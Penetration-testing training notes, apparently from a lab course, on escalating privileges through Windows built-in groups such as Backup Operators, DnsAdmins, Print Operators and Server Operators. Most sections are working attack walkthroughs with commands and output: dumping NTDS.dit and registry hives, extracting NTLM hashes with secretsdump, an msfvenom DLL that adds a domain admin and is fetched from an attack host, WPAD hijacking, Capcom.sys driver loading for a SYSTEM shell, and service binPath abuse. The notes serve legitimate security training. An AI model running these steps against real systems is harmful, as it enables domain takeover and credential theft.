
As mentioned in the `Windows Privileges Overview` section, Windows servers, and especially Domain Controllers, have a variety of built-in groups that either ship with the operating system or get added when the Active Directory Domain Services role is installed on a system to promote a server to a Domain Controller. Many of these groups confer special privileges on their members, and some can be leveraged to escalate privileges on a server or a Domain Controller. [Here](https://ss64.com/nt/syntax-security_groups.html) is a listing of all built-in Windows groups along with a detailed description of each. This [page](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory) has a detailed listing of privileged accounts and groups in Active Directory. It is essential to understand the implications of membership in each of these groups whether we gain access to an account that is a member of one of them or notice excessive/unnecessary membership in one or more of these groups during an assessment. For our purposes, we will focus on the following built-in groups. Each of these groups exists on systems from Server 2008 R2 to the present, except for Hyper-V Administrators (introduced with Server 2012).

Accounts may be assigned to these groups to enforce least privilege and avoid creating more Domain Admins and Enterprise Admins to perform specific tasks, such as backups. Sometimes vendor applications will also require certain privileges, which can be granted by assigning a service account to one of these groups. Accounts may also be added by accident or leftover after testing a specific tool or script. We should always check these groups and include a list of each group's members as an appendix in our report for the client to review and determine if access is still necessary.

||||
|---|---|---|
|[Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators)|[Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders)|[DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins)|
|[Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators)|[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)|[Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators)|

## 1 Backup Operators
After landing on a machine, we can use the command `whoami /groups` to show our current group memberships. Let's examine the case where we are a member of the `Backup Operators` group. Membership of this group grants its members the `SeBackup` and `SeRestore` privileges. The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag

#### Read All  Files
We can use this [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the `SeBackupPrivilege`, and copy this file. First, let's import the libraries in a PowerShell session.
##### Importing Libraries
```powershell
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```
##### Verifying SeBackupPrivilege is Enabled
Let's check if `SeBackupPrivilege` is enabled by invoking `whoami /priv` or `Get-SeBackupPrivilege` cmdlet. If the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.
>Note: Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.

```powershell 
whoami /priv
  # SeBackupPrivilege             Back up files and directories  Disabled
```
```powershell
Get-SeBackupPrivilege # SeBackupPrivilege is disabled
```
##### Enabling SeBackupPrivilege
If the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.
```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege    # SeBackupPrivilege is enabled
```
```powershell 
whoami /priv   # SeBackupPrivilege   Back up files and directories  Enabled
```
##### Copying a Protected File
As we can see above, the privilege was enabled successfully. This privilege can now be leveraged to copy any protected file.
```powershell
dir C:\Confidential\  # -a---- Contract.txt
cat 'C:\Confidential\2021 Contract.txt'
  # cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
```
```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
cat .\Contract.txt # <...SNIP...>
```
The commands above demonstrate how sensitive information was accessed without possessing the required permissions.

#### Attacking a Domain Controller - Copying NTDS.dit
**This group also permits logging in locally to a domain controller.** The active directory database `NTDS.dit` is a very attractive target, as it contains the NTLM hashes for all user and computer objects in the domain. However, this file is locked and is also not accessible by unprivileged users.

As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.
```powershell
diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

dir E:            # Directory: E:\
```
##### Copying NTDS.dit Locally
Next, we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally.
```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
##### Backing up SAM and SYSTEM Registry Hives
The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
==It's worth noting that if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the `FILE_FLAG_BACKUP_SEMANTICS` flag is specified.==

##### Extracting Credentials from NTDS.dit
With the NTDS.dit extracted, we can use a tool such as `secretsdump.py` or the PowerShell `DSInternals` module to extract all Active Directory account credentials. Let's obtain the NTLM hash for just the `administrator` account for the domain using `DSInternals`.
```powershell
Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

  # DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
  #   NTHash: cf3a5525ee9414229e66279623ed5c58
```
##### Extracting Hashes Using SecretsDump
We can also use `SecretsDump` offline to extract hashes from the `ntds.dit` file obtained earlier. These can then be used for pass-the-hash to access additional resources or cracked offline using `Hashcat` to gain further access. If cracked, we can also present the client with password cracking statistics to provide them with detailed insight into overall password strength and usage within their domain and provide recommendations for improving their password policy (increasing minimum length, creating a dictionary of disallowed words, etc.).
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
  # Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```
#### Robocopy
The built-in utility [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) can be used to copy files in backup mode as well. Robocopy is a command-line directory replication tool. It can be used to create backup jobs and includes features such as multi-threaded copying, automatic retry, the ability to resume copying, and more. Robocopy differs from the `copy` command in that instead of just copying all files, it can check the destination directory and remove files no longer in the source directory. It can also compare files before copying to save time by not copying files that have not been changed since the last copy/backup job ran.
```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
This eliminates the need for any external tools.

---
## 2 Event Log Readers
When process creation and command-line auditing is enabled, Windows logs this activity as **Event ID 4688** in the Security log. This helps defenders detect suspicious behavior and unauthorized binaries. Logs can be forwarded to SIEM or search platforms (e.g., Elastic) to flag unusual commands, such as **whoami, netstat, or tasklist** executed from non-technical user systems.

Attackers commonly run commands for discovery (**tasklist, ipconfig, systeminfo**), reconnaissance (**dir, net view, ping**), and lateral movement or malware execution (**wmic, reg, at, wusa**). Organizations can monitor these commands and further restrict them using **AppLocker**. Even without enterprise EDR, built-in Windows logging provides strong host-level visibility at low cost.

In one penetration test, a client with only process and command-line auditing detected and stopped an attacker when **tasklist** was run from a finance user’s workstation.

Access to these logs is limited to **Administrators** and **Event Log Readers**, allowing organizations to grant visibility to power users or developers without full administrative privileges.
#### Confirming Group Membership
```powershell
net localgroup "Event Log Readers"  # Members : logger
```

Microsoft has published a reference [guide](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf) for all built-in Windows commands, including syntax, parameters, and examples. Many Windows commands support passing a password as a parameter, and if auditing of process command lines is enabled, this sensitive information will be captured.

We can query Windows events from the command line using the [wevtutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) utility and the [Get-WinEvent](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1) PowerShell cmdlet.
#### Searching Security Logs Using wevtutil
```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
  # Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```
#### Passing Credentials to wevtutil
We can also specify alternate credentials for `wevtutil` using the parameters `/u` and `/p`
```cmd
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```
>Note: Searching the `Security` event log with `Get-WInEvent` requires administrator access or permissions adjusted on the registry key `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. Membership in just the `Event Log Readers` group is not sufficient.
#### Searching Security Logs Using Get-WinEvent
For `Get-WinEvent`, the syntax is as follows. In this example, we filter for process creation events (4688), which contain `/user` in the process command line.
```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }} | fl
```
The cmdlet can also be run as another user with the `-Credential` parameter.


---
## 3- DnsAdmins
Members of the [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) group have access to DNS information on the network. The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as `NT AUTHORITY\SYSTEM`, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. It is possible to use the built-in [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility to specify the path of the plugin DLL. As detailed in this excellent [post](https://adsecurity.org/?p=4064), the following attack can be performed when DNS is run on a Domain Controller (which is very common):

- DNS management is performed over RPC
- [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the `dnscmd` tool from the command line
- When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

Let's step through the attack.
### Leveraging DnsAdmins Access
#### Generating Malicious DLL
We can generate a malicious DLL to add a user to the `domain admins` group using `msfvenom`.
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

# add the user to local administrator group (non domain env)
msfvenom -p windows/x64/exec cmd='net localgroup Administrators netadm /add' -f dll -o adduser.dl
```
#### Starting Local HTTP Server
Next, start a Python HTTP server.
```bash
python3 -m http.server 7777
```
#### Downloading File to Target
Download the file to the target.
```powershell
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```
Let's first see what happens if we use the `dnscmd` utility to load a custom DLL with a non-privileged user.
#### Loading DLL as Non-Privileged User
```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
  # ERROR_ACCESS_DENIED
```
As expected, attempting to execute this command as a normal user isn't successful. Only members of the `DnsAdmins` group are permitted to do this.
#### Loading DLL as Member of DnsAdmins
```powershell
Get-ADGroupMember -Identity DnsAdmins # SamAccountName  : netadm
```
#### Loading Custom DLL
After confirming group membership in the `DnsAdmins` group, we can re-run the command to load a custom DLL.
```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
  # Registry property serverlevelplugindll successfully reset. 
```
> We must specify the full path to our custom DLL or the attack will not work properly.

Only the `dnscmd` utility can be used by members of the `DnsAdmins` group, as they do not directly have permission on the registry key.

With the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.

After restarting the DNS service (if our user has this level of access), we should be able to run our custom DLL and add a user (in our case) or get a reverse shell. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let's check our current user's permissions on the DNS service.
#### Finding User's SID
First, we need our user's SID.
```powershell
wmic useraccount where name="netadm" get sid
  # S-1-5-21-669053619-2741956077-1013132368-1109
```
#### Checking Permissions on DNS Service
Once we have the user's SID, we can use the `sc` command to check permissions on the service. Per this [article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/), we can see that our user has `RPWP` permissions which translate to `SERVICE_START` and `SERVICE_STOP`, respectively.
```powershell
sc.exe sdshow DNS
  # (A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)
  # (A;;PERMISSIONS;;;SID)
```
#### Stopping the DNS Service
After confirming these permissions, we can issue the following commands to stop and start the service.
```powershell
sc stop dns
```
The DNS service will attempt to start and run our custom DLL, but if we check the status, it will show that it failed to start correctly (more on this later).
#### Starting the DNS Service
```powershell
sc start dns  # STATE : 2  START_PENDING
```
#### Confirming Group Membership
If all goes to plan, our account will be added to the Domain Admins group or receive a reverse shell if our custom DLL was made to give us a connection back.
```powershell
net group "Domain Admins" /do # /dom for domain 
#   Administrator  :  netadm
```
### Cleaning Up
Making configuration changes and stopping/restarting the DNS service on a Domain Controller are very destructive actions and must be exercised with great care. As a penetration tester, we need to run this type of action by our client before proceeding with it since it could potentially take down DNS for an entire Active Directory environment and cause many issues. If our client gives their permission to go ahead with this attack, we need to be able to either cover our tracks and clean up after ourselves or offer our client steps on how to revert the changes.

These steps must be taken from an elevated console with a local or domain admin account.

#### Confirming Registry Key Added
The first step is confirming that the `ServerLevelPluginDll` registry key exists. Until our custom DLL is removed, we will not be able to start the DNS service again correctly.
```powershell
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
# ServerLevelPluginDll    REG_SZ    adduser.dll
```
#### Deleting Registry Key
We can use the `reg delete` command to remove the key that points to our custom DLL.
```cmd-session
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```
#### Starting the DNS Service Again
Once this is done, we can start up the DNS service again.
```powershell
sc.exe start dns  
```
#### Checking DNS Service Status
If everything went to plan, querying the DNS service will show that it is running. We can also confirm that DNS is working correctly within the environment by performing an `nslookup` against the localhost or another host in the domain.

```powershell
sc query dns   # RUNNING
```
Once again, this is a potentially destructive attack that we should only carry out with explicit permission from and in coordination with our client. If they understand the risks and want to see a full proof of concept, then the steps outlined in this section will help demonstrate the attack and clean up afterward.

### Using Mimilib.dll
As detailed in this [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner or another command of our choosing.
```c
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```
### Creating a WPAD Record
Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to [disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.

After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.

#### Disabling the Global Query Block List
To set up this attack, we first disabled the global query block list:
```powershell-session
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```
#### Adding a WPAD Record
Next, we add a WPAD record pointing to our attack machine.
```powershell-session
C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

---
## 4- Hyper-V Administrators
The [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) group has full access to all [Hyper-V features](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines). If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.

It is also well documented on this [blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), that upon deleting a virtual machine, `vmms.exe` attempts to restore the original file permissions on the corresponding `.vhdx` file and does so as `NT AUTHORITY\SYSTEM`, without impersonating the user. We can delete the `.vhdx` file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to.

If the operating system is vulnerable to [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) or [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.
#### Target File
An example of this is Firefox, which installs the `Mozilla Maintenance Service`. We can update [this exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (a proof-of-concept for NT hard link) to grant our current user full permissions on the file below:
```shell-session
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### Taking Ownership of the File
After running the PowerShell script, we should have full control of this file and can take ownership of it.
```cmd-session
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

#### Starting the Mozilla Maintenance Service
Next, we can replace this file with a malicious `maintenanceservice.exe`, start the maintenance service, and get command execution as SYSTEM.

```cmd-session
C:\htb> sc.exe start MozillaMaintenance
```
> This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.

---
## 5-Print Operators
[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, we will need to bypass UAC.
#### Confirming Privileges
```cmd
whoami /priv
```
###3 Checking Privileges Again (elevated cmd)
The [UACMe](https://github.com/hfiref0x/UACME) repo features a comprehensive list of UAC bypasses, which can be used from the command line. Alternatively, from a GUI, we can open an administrative command shell and input the credentials of the account that is a member of the Print Operators group. If we examine the privileges again, `SeLoadDriverPrivilege` is visible but disabled.
```powershell
whoami /priv  # SeLoadDriverPrivilege Load and unload device drivers  Disabled
```

### Exploit - GUI
It's well known that the driver `Capcom.sys` contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver. The PoC enables the privilege as well as loads the driver for us.

Download it locally and edit it, pasting over the includes below.
```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```
Next, from a Visual Studio 2019 Developer Command Prompt, compile it using **cl.exe**.
##### Compile with cl.exe
```cmd
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```
##### Add Reference to Driver
Next, download the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\temp`. Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.
```cmd-session
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
The odd syntax `\??\` used to reference our malicious driver's ImagePath is an [NT Object Path](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c). The Win32 API will parse and resolve this path to properly locate and load our malicious driver.
##### Verify Driver is not Loaded
Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the Capcom.sys driver is not loaded.
```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```
##### Verify Privilege is Enabled
Run the `EnableSeLoadDriverPrivilege.exe` binary.
```powershell
EnableSeLoadDriverPrivilege.exe
  # whoami:
  # INLANEFREIGHT0\printsvc

  # whoami /priv
  # SeLoadDriverPrivilege            Enabled
```
##### Verify Capcom Driver is Listed
Next, verify that the Capcom driver is now listed.
```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom 
  # Driver Name           : Capcom.sys
  # Filename              : C:\Tools\Capcom.sys
```
##### Use ExploitCapcom Tool to Escalate Privileges
To exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio.
```powershell
.\ExploitCapcom.exe     # [+] The SYSTEM shell was launched
```
This launches a shell with SYSTEM privileges.
![[Pasted image 20260116005539.png]]
### Alternate Exploitation - No GUI
If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.
```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```
The `CommandLine` string in this example would be changed to:
```c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```
We would set up a listener based on the `msfvenom` payload we generated and hopefully receive a reverse shell connection back when executing `ExploitCapcom.exe`. If a reverse shell connection is blocked for some reason, we can try a bind shell or exec/add user payload.
### Automating the Steps
We can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver. To do this, we would run the following:
```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```
We would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary.
### Clean-up

#### Removing Registry Key
We can cover our tracks a bit by deleting the registry key added earlier.
```cmd-session
reg delete HKCU\System\CurrentControlSet\Capcom

Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.
```

Note: Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".
>Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".


---

## 6- Server Operators
The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.
#### Querying the AppReadiness Service
Let's examine the `AppReadiness` service. We can confirm that this service starts as SYSTEM using the `sc.exe` utility.
```powershell
sc qc AppReadiness
  # SERVICE_START_NAME : LocalSystem
```
#### Checking Service Permissions with PsService
We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check permissions on the service. `PsService` works much like the `sc` utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.
```powershell
c:\Tools\PsService.exe security AppReadiness
   # [ALLOW] BUILTIN\Server Operators :  All
```
This confirms that the Server Operators group has [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) access right, which gives us full control over this service.
#### Checking Local Admin Group Membership
Let's take a look at the current members of the local administrators group and confirm that our target account is not present.
```powershell
net localgroup Administrators
  # Administrator
  # Domain Admins
  # Enterprise Admins
```
#### Modifying the Service Binary Path
Let's change the binary path to execute a command which adds our current user to the default local administrators group.
```cmd-session
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```
#### Starting the Service
Starting the service fails, which is expected.
```powershell
sc start AppReadiness 
   # StartService FAILED 1053:
```
#### Confirming Local Admin Group Membership
If we check the membership of the administrators group, we see that the command was executed successfully.
```powershell
net localgroup Administrators
  # Administrator
  # Domain Admins
  # Enterprise Admins
  # server_adm
```
#### Confirming Local Admin Access on Domain Controller
From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.
```bash
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```
#### Retrieving NTLM Password Hashes from the Domain Controller
```bash
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
  # Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

